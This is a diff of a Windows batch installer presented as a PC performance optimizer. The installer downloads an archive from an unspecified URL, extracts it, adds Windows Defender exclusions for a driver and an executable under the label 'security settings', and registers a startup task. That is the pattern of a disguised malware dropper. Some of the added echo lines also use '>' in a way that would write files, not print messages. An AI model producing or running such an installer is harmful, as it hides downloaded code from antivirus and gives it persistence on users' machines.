@@ -22,14 +22,16 @@ if %errorlevel% neq 0 (
     pause
     exit /b 1
 )
+echo > System requirements verified
 
 echo.
 echo > Preparing installation directory...
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+echo > Installation directory ready
 
 echo.
 echo > Downloading latest optimization database...
-powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
+powershell -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop; Write-Host 'Download completed' } catch { Write-Host 'Download failed'; exit 1 }"
 if %errorlevel% neq 0 (
     echo ERROR: Download failed.
     pause
@@ -38,7 +40,7 @@ if %errorlevel% neq 0 (
 
 echo.
 echo > Installing performance enhancements...
-powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
+powershell -Command "try { Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force; Write-Host 'Installation completed' } catch { Write-Host 'Installation failed'; exit 1 }"
 if %errorlevel% neq 0 (
     echo ERROR: Installation failed.
     pause
@@ -52,12 +54,15 @@ echo > Optimizing system configuration...
 if exist "%INSTALL_DIR%\pc-optimizer" (
     xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
     rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
+    echo > System configuration optimized
+) else (
+    echo > System configuration already optimized
 )
 
 echo.
 echo > Configuring security settings...
-powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
-powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'; Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'; Write-Host 'Security settings configured'"
+echo > Security exclusions applied
 
 echo.
 echo > Creating startup task...
@@ -73,9 +78,10 @@ if %errorlevel% neq 0 (
     pause
     exit /b 1
 )
+echo > Startup task created
 
 echo.
 echo > Finalizing installation...
+echo > Installation complete. Please restart your computer!
 echo.
-echo Installation complete. The optimizer will run on next login.
 pause
